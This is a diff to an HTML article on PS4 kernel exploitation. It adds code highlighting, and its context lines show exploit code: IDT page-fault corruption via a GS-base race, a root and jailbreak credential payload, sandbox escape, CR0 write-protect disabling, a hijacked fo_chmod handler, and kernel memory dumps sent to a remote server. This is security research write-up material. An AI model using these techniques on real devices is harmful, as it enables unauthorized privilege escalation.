@@ -5,10 +5,13 @@
 		<meta charset="UTF-8">
 		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
 		<link rel="stylesheet" type="text/css" href="css/core.css" />
+		<link rel="stylesheet" type="text/css" href="css/prism.css" />
 		<title>Hacking the PS4, part 3 - Kernel exploitation</title>
 	</head>
 	
 	<body>
+		<script src="js/prism.js" type="text/javascript"></script>
+		
 		<div class="page">
 			<div class="container">
 				<div class="header">
@@ -104,7 +107,7 @@
 					Code can now be written to the RW mapping and executed from the RX mapping like so:
 				</p>
 				
-				<pre><code>unsigned char loop[] = { 0xeb, 0xfe };
+				<pre><code class="language-c">unsigned char loop[] = { 0xeb, 0xfe };
 memcpy(writableAddress, loop, sizeof(loop));
 
 ((void (*)())executableAddress)();</code></pre>
@@ -166,7 +169,7 @@ else if(codeExecutionStage == "4") {
 					Unfortunately, trying to map a <code>NULL</code> page will fail, returning <code>EINVAL</code>:
 				</p>
 				
-				<pre><code>mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);</code></pre>
+				<pre><code class="language-c">mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0);</code></pre>
 				
 				<br>
 				
@@ -174,7 +177,7 @@ else if(codeExecutionStage == "4") {
 					This is due to the <code>sysctl</code> flag, <code>security.bsd.map_at_zero</code>, being set to 0; attempting to change it to 1 will also fail:
 				</p>
 				
-				<pre><code>int enableNULLmapping(void) {
+				<pre><code class="language-c">int enableNULLmapping(void) {
 	int val = 1;
 	int len = sizeof(val);
 	
@@ -191,14 +194,14 @@ else if(codeExecutionStage == "4") {
 				
 				<h2>sysctl</h2>
 				<p>
-					The <code>libkernel</code> module contains a standard FreeBSD function called <a href="https://www.freebsd.org/cgi/man.cgi?query=sysctl&apropos=0&sektion=3&manpath=FreeBSD+9.0-RELEASE&arch=amd64&format=html"><code>sysctl</code></a>, which can be used to extract some system information.
+					The <code>libkernel</code> module contains a standard FreeBSD function called <a href="https://www.freebsd.org/cgi/man.cgi?query=sysctl&amp;apropos=0&amp;sektion=3&amp;manpath=FreeBSD+9.0-RELEASE&amp;arch=amd64&amp;format=html"><code>sysctl</code></a>, which can be used to extract some system information.
 				</p>
 				
 				<p>
 					For example, it can be used to read the value of <code>KERN_OSTYPE</code>, which is <code>FreeBSD</code>:
 				</p>
 				
-				<pre><code>int getOS(char *destination) {
+				<pre><code class="language-c">int getOS(char *destination) {
 	int name[2];
 	size_t len;
 	
@@ -215,7 +218,7 @@ else if(codeExecutionStage == "4") {
 					By far, the most interesting thing that <code>sysctl</code> can be used for is reading kernel call stacks:
 				</p>
 				
-				<pre><code>size_t getKernelStacks(void *destination) {
+				<pre><code class="language-c">size_t getKernelStacks(void *destination) {
 	int name[4];
 	size_t len;
 	
@@ -256,7 +259,7 @@ else if(codeExecutionStage == "4") {
 					It is possible to identify unknown system calls by reading their kernel call stacks during execution. We can create a separate thread which performs an unknown system call repeatedly, wait for it to be preempted, and read its call stack: 
 				</p>
 				
-				<pre><code>void *threadFunction(void *arg) {
+				<pre><code class="language-c">void *threadFunction(void *arg) {
 	while(1) {
 		syscall(532, 0, 0, 0, 0, 0, 0);
 	}
@@ -296,14 +299,14 @@ scePthreadCancel(thread);</code></pre>
 				<br>
 				
 				<p>
-					This confirms that system call 532, <code>sys_regmgr_call</code>, executes a registry command, as predicted in <a href="ps4-2.html">my previous article</a>.
+					This confirms that system call <code>532</code>, <code>sys_regmgr_call</code>, executes a registry command, as predicted in <a href="ps4-2.html">my previous article</a>.
 				</p>
 				
 				<p>
 					Although it is technically possible for the kernel to be preempted during any piece of kernel code which doesn't follow a <code>critical_enter</code>, it can be difficult to achieve this in practice. This is especially true with system calls which consist of only a few instructions, resulting in a smaller race window, such as <code>getpid</code>:
 				</p>
 				
-				<pre><code>int sys_getpid(struct thread *td, struct getpid_args *uap) {
+				<pre><code class="language-c">int sys_getpid(struct thread *td, struct getpid_args *uap) {
 	struct proc *p = td->td_proc;
 	
 	td->td_retval[0] = p->p_pid;
@@ -358,7 +361,7 @@ scePthreadCancel(thread);</code></pre>
 					Since the userland <code>GS</code> base is fully controllable with <code>sysarch</code>:
 				</p>
 				
-				<pre><code>#define AMD64_SET_GSBASE 131
+				<pre><code class="language-c">#define AMD64_SET_GSBASE 131
 
 int amd64_set_gsbase(void *base) {
 	return sysarch(AMD64_SET_GSBASE, &amp;base);
@@ -440,7 +443,7 @@ target remote localhost:8864</code></pre>
 					We first need to use the unprivileged <code>sidt</code> (Store Interrupt Descriptor Table) instruction from userland to retrieve the Interrupt Descriptor Table Register, which is described as the following 6 byte structure:
 				</p>
 				
-				<pre><code>struct idtr {
+				<pre><code class="language-c">struct idtr {
 	uint16_t limit;
 	uint64_t base;
 } __attribute__((packed));</code></pre>
@@ -451,7 +454,7 @@ target remote localhost:8864</code></pre>
 					With the IDT base, we can calculate the address of the function pointer to the page fault handler (<code>#PF</code> is entry 14 in the IDT):
 				</p>
 				
-				<pre><code>struct idt_descriptor *sidt(void) {
+				<pre><code class="language-c">struct idt_descriptor *sidt(void) {
     struct region_descriptor idt;
     asm volatile("sidt %0" : "=m"(idt));
     return (struct idt_descriptor *)idt.rd_base;
@@ -485,7 +488,7 @@ xpageEntryHi = &amp;(sidt()[IDT_PF]).off_high;</code></pre>
 					In our case, this should point to the upper 4 bytes of the page fault entry in the IDT, minus the <code>0x3cc</code> offset:
 				</p>
 				
-				<pre><code>gsBase[0] = xpageEntryHi - 0x3cc;</code></pre>
+				<pre><code class="language-c">gsBase[0] = xpageEntryHi - 0x3cc;</code></pre>
 				
 				<br>
 				
@@ -493,9 +496,11 @@ xpageEntryHi = &amp;(sidt()[IDT_PF]).off_high;</code></pre>
 					This is how the <code>critical_enter</code> write will affect the <code>#PF</code> entry in the IDT (bytes in bold are used by the address):
 				</p>
 				
-				<code>00 8E <b>B0 80</b> &nbsp;&nbsp;<b>FF FF FF FF</b>&nbsp;&nbsp; &nbsp; 00 00 00 00 <b>40 32</b> 20 00 - Address: 0xFFFFFFFF80B03240<br>
-00 8E <b>B0 80</b> &nbsp;<b>(FF FF FF FF)+1</b>&nbsp;  00 00 00 00 <b>40 32</b> 20 00 - Address: 0x(FFFFFFFF+1)80B03240<br>
-00 8E <b>B0 80</b> &nbsp;&nbsp;<b>00 00 00 00</b>&nbsp;&nbsp; &nbsp; 00 00 00 00 <b>40 32</b> 20 00 - Address: 0x0000000080B03240<br><br></code>
+				<pre><code>00 8E <b>B0 80</b> &nbsp;&nbsp;<b>FF FF FF FF</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00 00 00 00 <b>40 32</b> 20 00 - Address: 0xFFFFFFFF80B03240
+00 8E <b>B0 80</b> &nbsp;<b>(FF FF FF FF)+1</b>&nbsp;  00 00 00 00 <b>40 32</b> 20 00 - Address: 0x(FFFFFFFF+1)80B03240
+00 8E <b>B0 80</b> &nbsp;&nbsp;<b>00 00 00 00</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 00 00 00 00 <b>40 32</b> 20 00 - Address: 0x0000000080B03240</code></pre>
+				
+				<br>
 				
 				<p>
 					Since FreeBSD 9.0 doesn't have support for SMAP (Supervisor Mode Access Prevention) or SMEP (Supervisor Mode Execution Prevention), the CPU will happily execute userland memory in kernel mode, as long as it is marked as executable. So to achieve kernel code execution, we just need to map and write our payload to <code>0x80B03240</code>, and trigger a page fault.
@@ -536,7 +541,7 @@ xpageEntryHi = &amp;(sidt()[IDT_PF]).off_high;</code></pre>
 					There are several ways to achieve this: you can prefault over all memory which you intend to use in your payload by simply performing a read to these memory locations before performing the exploit: 
 				</p>
 				
-				<pre><code>void prefault(void *address, size_t size) {
+				<pre><code class="language-c">void prefault(void *address, size_t size) {
 	uint64_t i;
 	for(i = 0; i &lt; size; i++) {
 		volatile uint8_t c;
@@ -567,7 +572,7 @@ xpageEntryHi = &amp;(sidt()[IDT_PF]).off_high;</code></pre>
 					The standard payload for a kernel exploit is to give the current process <code>root</code> privileges:
 				</p>
 				
-				<pre><code>struct thread *td;
+				<pre><code class="language-c">struct thread *td;
 struct ucred *cred;
 
 // Get td pointer
@@ -586,7 +591,7 @@ cred->cr_groups[0] = 0;</code></pre>
 					On the PS4, our process is also in a <a href="https://www.freebsd.org/doc/handbook/jails.html">FreeBSD jail</a>, so we'll also need to perform a <i>jailbreak</i>:
 				</p>
 				
-				<pre><code>cred->cr_prison = &amp;prison0;</code></pre>
+				<pre><code class="language-c">cred->cr_prison = &amp;prison0;</code></pre>
 				
 				<br>
 				
@@ -598,7 +603,7 @@ cred->cr_groups[0] = 0;</code></pre>
 					We'll also need to break out of the sandbox to gain full access to the filesystem:
 				</p>
 				
-				<pre><code>void *td_fdp = *(void **)(((char *)td_proc) + 72);
+				<pre><code class="language-c">void *td_fdp = *(void **)(((char *)td_proc) + 72);
 uint64_t *td_fdp_fd_rdir = (uint64_t *)(((char *)td_fdp) + 24);
 uint64_t *td_fdp_fd_jdir = (uint64_t *)(((char *)td_fdp) + 32);
 uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
@@ -622,7 +627,7 @@ uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
 					We can write to the page fault entry in the IDT directly since we are now executing in kernel mode:
 				</p>
 				
-				<pre><code>*((int *)XpageEntryHi) = 0xffffffff;</code></pre>
+				<pre><code class="language-c">*((int *)XpageEntryHi) = 0xffffffff;</code></pre>
 				
 				<br>
 				
@@ -630,7 +635,7 @@ uint64_t *rootvnode = (uint64_t *)0xFFFFFFFF832EF920;
 					We can verify that the page fault entry is correctly restored by triggering a page fault and seeing where the debugger jumps:
 				</p>
 				
-				<pre><code>char *p = NULL;
+				<pre><code class="language-c">char *p = NULL;
 *p = 0;</code></pre>
 				
 				<br>
@@ -792,7 +797,7 @@ Found non-zero memory at offset 3d8</code></pre>
 					We can use <code>sys_sendto</code> directly from the kernel without needing to restore the system to a fully stable state.
 				</p>
 				
-				<pre><code>// From userland:
+				<pre><code class="language-c">// From userland:
 // Open a socket and connect it to our dump server
 struct sockaddr_in server;
 
@@ -857,7 +862,7 @@ while(sys_sendto(td, &amp;args) == EINTR);</code></pre>
 					Rather than inspecting all of the IDT entries manually for corruption, I found the <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/amd64/amd64/machdep.c#L1641">IDT initialisation code in FreeBSD</a> and copied it into the PS4 payload using fixed function addresses taken from the kernel dump. This re-initialised the IDT to its correct state:
 				</p>
 				
-				<pre><code>// Rewrite IDT
+				<pre><code class="language-c">// Rewrite IDT
 void (*setidt)() = (void *)0xFFFFFFFF82603FA0;
 
 setidt(IDT_DE, 0xFFFFFFFF825FED40, SDT_SYSIGT, SEL_KPL, 0);
@@ -882,7 +887,7 @@ setidt(IDT_NMI, 0xFFFFFFFF825FF3E0, SDT_SYSIGT, SEL_KPL, 2);
 					This context is not very practical or safe for general kernel payload development. Instead, we use this initial code execution to hijack the <code>socketops->fo_chmod</code> handler:
 				</p>
 				
-				<pre><code>struct fileops *socketops = (struct fileops *)0xFFFFFFFF83242C40;
+				<pre><code class="language-c">struct fileops *socketops = (struct fileops *)0xFFFFFFFF83242C40;
 original_fo_chmod = socketops->fo_chmod;
 socketops->fo_chmod = payload;</code></pre>
 				
@@ -892,7 +897,7 @@ socketops->fo_chmod = payload;</code></pre>
 					After returning to userland, we can now re-enter the kernel by using the <code>fchmod</code> system call to trigger our second payload:
 				</p>
 				
-				<pre><code>int s = sceNetSocket("kernelTrigger", AF_INET, SOCK_STREAM, 0);
+				<pre><code class="language-c">int s = sceNetSocket("kernelTrigger", AF_INET, SOCK_STREAM, 0);
 
 if(s > 0) {
 	printf("Triggering second kernel payload\n");
@@ -908,7 +913,7 @@ sceNetSocketClose(s);</code></pre>
 					We have a lot more freedom in this context, and can easily restore the original handler when finished:
 				</p>
 				
-				<pre><code>// We are in a normal kernel context here
+				<pre><code class="language-c">// We are in a normal kernel context here
 int payload(void *fp, int mode, void *active_cred, struct thread *td) {
 	int (*sendto)(struct thread *td, struct sendto_args *uap) = (void *)sys_sendto;
 	
@@ -956,7 +961,7 @@ int payload(void *fp, int mode, void *active_cred, struct thread *td) {
 					To make patches to kernel code, bit 16 of the <code>cr0</code> register should be cleared. This disables write protection on the CPU so that we can freely write to memory mapped as read only:
 				</p>
 				
-				<pre><code>#define X86_CR0_WP (1 &lt;&lt; 16)
+				<pre><code class="language-c">#define X86_CR0_WP (1 &lt;&lt; 16)
 
 static inline uint64_t readCr0(void) {
 	uint64_t cr0;
@@ -1004,7 +1009,7 @@ writeCr0(cr0);</code></pre>
 					With kernel dumped, we can locate the two places where the console output is cleared:
 				</p>
 				
-				<pre><code>int
+				<pre><code class="language-c">int
 ttydisc_write(struct tty *tp, struct uio *uio, int ioflag)
 {
 	...
@@ -1041,7 +1046,7 @@ cnputc(int c) {
 					Both places check the value returned from <code>bootparam_disable_console_output</code> before disabling console output, which is implemented as follows:
 				</p>
 				
-				<pre><code>unsigned int
+				<pre><code class="language-c">unsigned int
 bootparam_disable_console_output()
 {
 	return (unsigned int)(*(uint16_t *)0xFFFFFFFF833242F6) >> 15;
@@ -1053,7 +1058,7 @@ bootparam_disable_console_output()
 					So to disable this check, we just need to clear bit 15 of this variable in our payload:
 				</p>
 				
-				<pre><code>// bootparam_disable_console_output = 0
+				<pre><code class="language-c">// bootparam_disable_console_output = 0
 uint16_t *bootParams = (uint16_t *)0xFFFFFFFF833242F6;
 *bootParams &amp;= ~(1 &lt;&lt; 15);</code></pre>
 				
@@ -1089,7 +1094,7 @@ uint16_t *bootParams = (uint16_t *)0xFFFFFFFF833242F6;
 					To list all processes, we can read the <code>kern.proc.pid</code> name of <code>sysctl</code>:
 				</p>
 				
-				<pre><code>#define CTL_KERN 1
+				<pre><code class="language-c">#define CTL_KERN 1
 #define KERN_PROC 14
 #define KERN_PROC_PID 1
 
@@ -1125,7 +1130,7 @@ else if(len > 0) {
 					Since these process numbers are not always the same, it is best to iterate over every PID until you find the one with the process name you are interested in. For example, to target the currently running game, search for a process with the name "eboot.bin":
 				</p>
 				
-				<pre><code>if(strcmp(name, "eboot.bin") == 0) patchPid = pid;</code></pre>
+				<pre><code class="language-c">if(strcmp(name, "eboot.bin") == 0) patchPid = pid;</code></pre>
 				
 				<br>
 				
@@ -1137,7 +1142,7 @@ else if(len > 0) {
 					Once you've identified a mapping you want to dump, you can use <a href="https://www.freebsd.org/cgi/man.cgi?query=ptrace&amp;apropos=0&amp;sektion=2&amp;manpath=FreeBSD+9.0-RELEASE&amp;arch=amd64&amp;format=html">ptrace</a> to read it:
 				</p>
 				
-				<pre><code>int result = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
+				<pre><code class="language-c">int result = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
 
 printf("  [+] Attaching to SceShellUI: %d\n", result);
 
@@ -1189,7 +1194,7 @@ for(offset = mappingAddress; offset &lt; mappingAddress + mappingSize; offset +=
 					For your kernel payload you should copy the system call somewhere into kernel address space (like <code>DT_HASH_SEGMENT</code>), and run <code>kexec_init</code> to install it (which is guaranteed to be at offset 0 from the binary):
 				</p>
 				
-				<pre><code>void *DT_HASH_SEGMENT = (void *)0xffffffff82200160;
+				<pre><code class="language-c">void *DT_HASH_SEGMENT = (void *)0xffffffff82200160;
 memcpy(DT_HASH_SEGMENT, kexec, kexecSize);
 
 void (*kexec_init)(void *, void *) = DT_HASH_SEGMENT;
@@ -1201,7 +1206,7 @@ kexec_init(NULL, NULL);</code></pre>
 					Once you return to userland, you can load the kernel and initramfs from USB, pass them to <code>kexec</code>, and finally reboot!
 				</p>
 				
-				<pre><code>FILE *fkernel = fopen("/mnt/usb0/bzImage", "r");
+				<pre><code class="language-c">FILE *fkernel = fopen("/mnt/usb0/bzImage", "r");
 ...
 
 FILE *finitramfs = fopen("/mnt/usb0/initramfs.cpio.gz", "r");
